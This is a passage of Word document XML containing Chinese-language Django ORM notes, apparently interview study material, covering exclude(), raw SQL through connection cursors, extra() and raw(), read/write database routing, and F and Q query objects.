          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>查出符合条件</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="481D97C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条件可以是：参数，字典，</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>Q</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3253A81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4E63960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exclude(self, *args, **kwargs)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5D7F5C1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条件查询</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排除条件</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="79FBC3A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排除不想要的</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="44410E7D" w14:textId="2831D575"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条件可以是：参数，字典，</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>Q</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="39D35BB8" w14:textId="7089FF8C"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032</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列举</w:t>
      </w:r>
      <w:r w:rsidR="003942C2" w:rsidRPr="00652BA5">
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:eastAsia="宋体" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="24292E"/>
          <w:kern w:val="0"/>
          <w:sz w:val="36"/>
          <w:szCs w:val="36"/>
        </w:rPr>
        <w:t>django orm</w:t>
      </w:r>
      <w:r w:rsidR="003942C2" w:rsidRPr="00652BA5">
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:eastAsia="宋体" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="24292E"/>
          <w:kern w:val="0"/>
          <w:sz w:val="36"/>
          <w:szCs w:val="36"/>
        </w:rPr>
        <w:t>中三种能写</w:t>
      </w:r>
      <w:r w:rsidR="003942C2" w:rsidRPr="00652BA5">
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:eastAsia="宋体" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="24292E"/>
          <w:kern w:val="0"/>
          <w:sz w:val="36"/>
          <w:szCs w:val="36"/>
        </w:rPr>
        <w:t>sql</w:t>
      </w:r>
      <w:r w:rsidR="003942C2" w:rsidRPr="00652BA5">
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:eastAsia="宋体" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="24292E"/>
          <w:kern w:val="0"/>
          <w:sz w:val="36"/>
          <w:szCs w:val="36"/>
        </w:rPr>
        <w:t>语句的方法。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7C72784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原生</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>SQL ---&gt;  connection</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4E7E601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django.db import connection, connections</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="61383F4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cursor = connection.cursor()  # cursor = connections['default'].cursor()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="45E024C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cursor.execute("""SELECT * from auth_user where id = %s""", [1])</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="42EF3FD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row = cursor.fetchone() # fetchall()/fetchmany(..)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="211627B7" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRPr="00BC0D9A" w:rsidRDefault="00D8288D"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F71876D" w14:textId="5F8F8CB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靠近原生</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>SQL--&gt;extra\raw</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="71655CC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extra</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="58A4313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extra</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2E0070A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extra(self, select=None, where=None, params=None, tables=None, order_by=None, </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="61EFA66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select_params=None)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="41D01D3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构造额外的查询条件或者映射，如：子查询</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="67FE296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Entry.objects.extra(select={'new_id': "select col from sometable where othercol &gt; %s"},</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1C879E3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select_params=(1,))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="19CCEA7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Entry.objects.extra(where=['headline=%s'], params=['Lennon'])</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="654A915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Entry.objects.extra(where=["foo='a' OR bar = 'a'", "baz = 'a'"])</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="78B6C1D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Entry.objects.extra(select={'new_id': "select id from tb where id &gt; %s"}, s</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="163681D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elect_params=(1,), order_by=['-nid'])</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4420B66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3602735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raw </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="170EEBD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raw(self, raw_query, params=None, translations=None, using=None):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3279F21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执行原生</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>SQL</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0B49408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models.UserInfo.objects.raw('select * from userinfo')</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="143D9BF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如果</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>SQL</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>是其他表时，必须将名字设置为当前</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>UserInfo</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>对象的主键列名</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1A96190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models.UserInfo.objects.raw('select id as nid,name as title  from </w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>其他表</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>')</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0B4B969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为原生</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>SQL</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>设置参数</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6DDBC47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models.UserInfo.objects.raw('select id as nid from userinfo where nid&gt;%s', params=[12,])</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="230BEA6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 </w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>将获取的到列名转换为指定列名</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1B2B887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name_map = {'first': 'first_name', 'last': 'last_name', 'bd': 'birth_date', 'pk': 'id'}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="701E44E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Person.objects.raw('SELECT * FROM some_other_table', translations=name_map)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5445E9F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指定数据库</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="152CFE41" w14:textId="164AF805"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models.UserInfo.objects.raw('select * from userinfo', using="default")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6540298F" w14:textId="09999700"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033</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 xml:space="preserve">django orm </w:t>
      </w:r>
      <w:r w:rsidR="003942C2" w:rsidRPr="00652BA5">
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:eastAsia="宋体" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="24292E"/>
          <w:kern w:val="0"/>
          <w:sz w:val="36"/>
          <w:szCs w:val="36"/>
        </w:rPr>
        <w:t>中如何设置读写分离？</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="69872F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3942C2">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="宋体" w:hAnsi="Consolas" w:cs="宋体"/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>方式一：手动使用</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>queryset</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>的</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>using</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>方法</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0243EDC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django.shortcuts import render,HttpResponse</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0304CEF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app01 import models</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6A85C3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index(request):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="28B7BAB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2B83C57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models.UserType.objects.using('db1').create(title='</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>普通用户</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>')</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="793B5A2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手动指定去某个数据库取数据</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="74FE173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result = models.UserType.objects.all().using('db1')</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="52CD171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print(result)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="20FC525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0AEF537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HttpResponse('...')</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1A617B6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28C81EB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方式二：写配置文件</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="204E6B4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class Router1:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7B77649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指定到某个数据库取数据</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2E5B5CE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db_for_read(self, model, **hints):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="02081EF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C9834F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Attempts to read auth models go to auth_db.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="46355FD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8A9D59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if model._meta.model_name == 'usertype':</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="767307D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'db1'</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3601DAF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else:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="00391CC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'default'</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2A12C8B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指定到某个数据库存数据</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2DAB62C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db_for_write(self, model, **hints):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="22F896E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35C0E68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Attempts to write auth models go to auth_db.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4458394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79B5FF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'default'</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6EBE7A5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再写到配置</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1C698C5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DATABASES = {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1838D85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'default': {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="57D158E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'ENGINE': 'django.db.backends.sqlite3',</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="154D609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'NAME': os.path.join(BASE_DIR, 'db.sqlite3'),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="547ED77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11DF2C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'db1': {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="14F7E61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'ENGINE': 'django.db.backends.sqlite3',</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="05427E0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'NAME': os.path.join(BASE_DIR, 'db.sqlite3'),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="62E9E0E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4166029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p>
    <w:p w14:paraId="7923365F" w14:textId="12E9262C"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DATABASE_ROUTERS = ['db_router.Router1',]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1F76E091" w14:textId="73A1CCC0"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034</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Q</w:t>
      </w:r>
      <w:r w:rsidR="003942C2" w:rsidRPr="00652BA5">
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:eastAsia="宋体" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="24292E"/>
          <w:kern w:val="0"/>
          <w:sz w:val="36"/>
          <w:szCs w:val="36"/>
        </w:rPr>
        <w:t>的作用</w:t>
      </w:r>
      <w:r w:rsidR="003942C2" w:rsidRPr="00652BA5">
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:eastAsia="宋体" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="24292E"/>
          <w:kern w:val="0"/>
          <w:sz w:val="36"/>
          <w:szCs w:val="36"/>
        </w:rPr>
        <w:t>?</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2E91D44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w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>主要用来获取原数据进行计算。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2B8A353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Django </w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>支持</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> F() </w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>对象之间以及</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> F() </w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>对象和常数之间的加减乘除和取模的操作。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="70291F8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修改操作也可以使用</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>F</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>函数</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比如将每件商品的价格都在原价格的基础上增加</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>10</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="74AB6AF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django.db.models import F</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6F3449F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app01.models import Goods</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4405A14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6087D162"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Goods.objects.update(price=F("price")+10)  # </w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>对于</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>goods</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>表中每件商品的价格都在原价格的基础上增加</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>10</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>元</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="27081A73" w14:textId="69FE6C26"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w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>查询专门对对象中某列值的操作，不可使用</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>__</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>双下划线！</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0BB1E437"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Q:</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>用来进行复杂查询</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2D4F0D60"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Q</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>查询可以组合使用</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> “&amp;”, “|” </w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>操作符，当一个操作符是用于两个</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>Q</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>的对象</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它产生一个新的</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>Q</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>对象，</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="208E2B71"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Q</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>对象可以用</w:t>
      </w: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操作符放在前面表示否定，也可允许否定与不否定形式的组合。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="766C3CE9"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Q</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>对象可以与关键字参数查询一起使用，不过一定要把</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>Q</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>对象放在关键字参数查询的前面。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7CEB6D77" w14:textId="092548F3"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ED3573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Q(</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>条件</w:t>
